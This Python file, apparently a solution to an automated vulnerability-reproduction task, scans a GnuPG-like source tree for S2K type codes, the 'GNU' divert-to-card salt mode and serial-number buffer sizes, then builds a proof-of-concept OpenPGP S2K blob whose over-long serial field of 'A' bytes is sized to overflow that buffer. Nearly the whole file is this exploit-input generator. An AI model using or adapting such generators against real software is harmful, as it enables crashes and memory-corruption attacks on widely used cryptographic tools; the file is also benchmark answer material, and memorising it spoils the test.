import os
import re
import tarfile
import ast
from typing import Dict, List, Optional, Tuple


_SOURCE_EXTS = (
    ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inc", ".inl", ".y", ".l"
)

_MAX_FILE_SIZE = 2_000_000


def _is_source_file(name: str) -> bool:
    nl = name.lower()
    return any(nl.endswith(ext) for ext in _SOURCE_EXTS)


def _read_text_bytes(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        return b.decode("latin1", "ignore")


_ALLOWED_BINOPS = (
    ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod,
    ast.BitOr, ast.BitAnd, ast.BitXor, ast.LShift, ast.RShift
)
_ALLOWED_UNARYOPS = (ast.UAdd, ast.USub, ast.Invert)


def _safe_eval_int_expr(expr: str, macros: Dict[str, int]) -> Optional[int]:
    if not expr:
        return None
    expr = expr.strip()
    expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S)
    expr = re.sub(r"//.*", "", expr)
    expr = expr.strip()
    if not expr:
        return None

    expr = expr.replace("U", "").replace("L", "").replace("u", "").replace("l", "")
    expr = expr.strip()

    if re.fullmatch(r"0[xX][0-9a-fA-F]+", expr):
        try:
            return int(expr, 16)
        except Exception:
            return None
    if re.fullmatch(r"[0-9]+", expr):
        try:
            return int(expr, 10)
        except Exception:
            return None

    expr2 = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)

    try:
        node = ast.parse(expr2, mode="eval")
    except Exception:
        return None

    def _eval(n) -> Optional[int]:
        if isinstance(n, ast.Expression):
            return _eval(n.body)
        if isinstance(n, ast.Constant):
            if isinstance(n.value, (int,)):
                return int(n.value)
            return None
        if isinstance(n, ast.Num):  # pragma: no cover
            return int(n.n)
        if isinstance(n, ast.Name):
            return macros.get(n.id)
        if isinstance(n, ast.BinOp):
            if not isinstance(n.op, _ALLOWED_BINOPS):
                return None
            a = _eval(n.left)
            b = _eval(n.right)
            if a is None or b is None:
                return None
            try:
                if isinstance(n.op, ast.Add):
                    return a + b
                if isinstance(n.op, ast.Sub):
                    return a - b
                if isinstance(n.op, ast.Mult):
                    return a * b
                if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(n.op, ast.Mod):
                    if b == 0:
                        return None
                    return a % b
                if isinstance(n.op, ast.BitOr):
                    return a | b
                if isinstance(n.op, ast.BitAnd):
                    return a & b
                if isinstance(n.op, ast.BitXor):
                    return a ^ b
                if isinstance(n.op, ast.LShift):
                    if b < 0 or b > 63:
                        return None
                    return a << b
                if isinstance(n.op, ast.RShift):
                    if b < 0 or b > 63:
                        return None
                    return a >> b
            except Exception:
                return None
            return None
        if isinstance(n, ast.UnaryOp):
            if not isinstance(n.op, _ALLOWED_UNARYOPS):
                return None
            a = _eval(n.operand)
            if a is None:
                return None
            try:
                if isinstance(n.op, ast.UAdd):
                    return +a
                if isinstance(n.op, ast.USub):
                    return -a
                if isinstance(n.op, ast.Invert):
                    return ~a
            except Exception:
                return None
            return None
        if isinstance(n, ast.ParenExpr):  # pragma: no cover
            return _eval(n.expression)
        return None

    val = _eval(node)
    if val is None:
        return None
    if not isinstance(val, int):
        return None
    return val


def _extract_macros_from_text(text: str, macros: Dict[str, int]) -> None:
    for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Z][A-Z0-9_]+)\s+(.+?)\s*$", text):
        name = m.group(1)
        rhs = m.group(2).strip()
        if "(" in name:
            continue
        if rhs.startswith("(") and rhs.endswith(")") and rhs.count("(") == rhs.count(")"):
            rhs2 = rhs
        else:
            rhs2 = rhs
        v = _safe_eval_int_expr(rhs2, macros)
        if v is None:
            continue
        if -2**31 <= v <= 2**31 - 1:
            macros.setdefault(name, v)


def _iter_sources_from_tar(src_path: str) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    with tarfile.open(src_path, "r:*") as tf:
        for member in tf.getmembers():
            if not member.isfile():
                continue
            if member.size <= 0 or member.size > _MAX_FILE_SIZE:
                continue
            name = member.name
            if not _is_source_file(name):
                continue
            f = tf.extractfile(member)
            if not f:
                continue
            try:
                b = f.read()
            finally:
                try:
                    f.close()
                except Exception:
                    pass
            out.append((name, _read_text_bytes(b)))
    return out


def _iter_sources_from_dir(src_dir: str) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            path = os.path.join(root, fn)
            rel = os.path.relpath(path, src_dir)
            if not _is_source_file(rel):
                continue
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > _MAX_FILE_SIZE:
                continue
            try:
                with open(path, "rb") as f:
                    b = f.read()
            except Exception:
                continue
            out.append((rel, _read_text_bytes(b)))
    return out


def _analyze_sources(sources: List[Tuple[str, str]]) -> Tuple[int, int]:
    macros: Dict[str, int] = {}
    for _, text in sources:
        _extract_macros_from_text(text, macros)

    s2k_type = None
    for k, v in macros.items():
        ku = k.upper()
        if "S2K" in ku and ("GNU" in ku or "GNUPG" in ku) and 1 <= v <= 255:
            if v in (101, 0x65):
                s2k_type = 101
                break
            if 64 <= v <= 200:
                s2k_type = v
    if s2k_type is None:
        for _, text in sources:
            tl = text.lower()
            if "s2k" not in tl:
                continue
            if ("case 101" in text) and ("gnu" in tl):
                s2k_type = 101
                break
            if ("0x65" in text) and ("gnu" in tl or "gnupg" in tl) and ("s2k" in tl):
                s2k_type = 101
                break
    if s2k_type is None:
        s2k_type = 3

    mode = None
    for k, v in macros.items():
        ku = k.upper()
        if ("DIVERT" in ku or "CARD" in ku) and "S2K" in ku and 0 <= v <= 255:
            if "CARD" in ku and (("DIVERT" in ku) or ("OPENPGP" in ku) or ("SERIAL" in ku)):
                mode = v
                break
    if mode is None:
        for k, v in macros.items():
            ku = k.upper()
            if ("DIVERT" in ku and "CARD" in ku) and 0 <= v <= 255:
                mode = v
                break
    if mode is None:
        for _, text in sources:
            tl = text.lower()
            if "salt[3]" in text and ("divert" in tl and "card" in tl):
                mm = re.search(r"salt\s*\[\s*3\s*\]\s*==\s*(0x[0-9a-fA-F]+|\d+)", text)
                if mm:
                    try:
                        mode = int(mm.group(1), 0)
                        break
                    except Exception:
                        pass
    if mode is None:
        mode = 1

    serial_buf_sizes: List[int] = []

    array_re = re.compile(
        r"\b(?:unsigned\s+char|char|byte|u8|uint8_t)\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\[\s*([^\]]+)\s*\]"
    )
    for _, text in sources:
        tl = text.lower()
        if "serial" not in tl:
            continue
        context_score = 0
        if "s2k" in tl:
            context_score += 2
        if "gnu" in tl or "gnupg" in tl:
            context_score += 1
        if context_score == 0:
            continue
        for m in array_re.finditer(text):
            var = m.group(1).lower()
            if "serial" not in var:
                continue
            size_expr = m.group(2).strip()
            v = _safe_eval_int_expr(size_expr, macros)
            if v is None:
                continue
            if 1 <= v <= 256:
                serial_buf_sizes.append(int(v))

    if not serial_buf_sizes:
        for _, text in sources:
            tl = text.lower()
            if "serial" not in tl:
                continue
            for m in array_re.finditer(text):
                var = m.group(1).lower()
                if "serial" not in var:
                    continue
                size_expr = m.group(2).strip()
                v = _safe_eval_int_expr(size_expr, macros)
                if v is None:
                    continue
                if 1 <= v <= 256:
                    serial_buf_sizes.append(int(v))

    serial_buf_size = None
    plausible = [x for x in serial_buf_sizes if 4 <= x <= 64]
    if plausible:
        serial_buf_size = min(plausible)
    else:
        plausible2 = [x for x in serial_buf_sizes if 1 <= x <= 128]
        if plausible2:
            serial_buf_size = min(plausible2)

    if serial_buf_size is None:
        serial_buf_size = 15

    return int(s2k_type) & 0xFF, int(serial_buf_size)


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            sources = _iter_sources_from_dir(src_path)
        else:
            sources = _iter_sources_from_tar(src_path)

        s2k_type, serial_buf_size = _analyze_sources(sources)

        # Try to pick a minimal overflowing length.
        serial_len = max(16, serial_buf_size + 1)

        # Build an S2K-like blob:
        # [type][hash][salt(8)="GNU"+mode+0000][count][serial...]
        hash_algo = 2  # SHA1 is commonly '2' in OpenPGP contexts.
        mode = 1

        # Recompute a better mode if possible (lightweight scan from sources)
        # (Keep deterministic and safe if scan fails.)
        best_mode = None
        for _, text in sources:
            tl = text.lower()
            if "divert" in tl and "card" in tl and "gnu" in tl:
                mm = re.search(r"salt\s*\[\s*3\s*\]\s*=\s*(0x[0-9a-fA-F]+|\d+)", text)
                if mm:
                    try:
                        best_mode = int(mm.group(1), 0) & 0xFF
                        break
                    except Exception:
                        pass
                mm = re.search(r"salt\s*\[\s*3\s*\]\s*==\s*(0x[0-9a-fA-F]+|\d+)", text)
                if mm:
                    try:
                        best_mode = int(mm.group(1), 0) & 0xFF
                        break
                    except Exception:
                        pass
        if best_mode is not None:
            mode = best_mode

        salt = b"GNU" + bytes([mode & 0xFF]) + b"\x00\x00\x00\x00"
        count = b"\x00"
        serial = b"A" * (serial_len - 1) + b"\x00"

        poc = bytes([s2k_type, hash_algo]) + salt + count + serial

        # Keep exact length to intended construction (defensive).
        return poc[: (2 + 8 + 1 + serial_len)]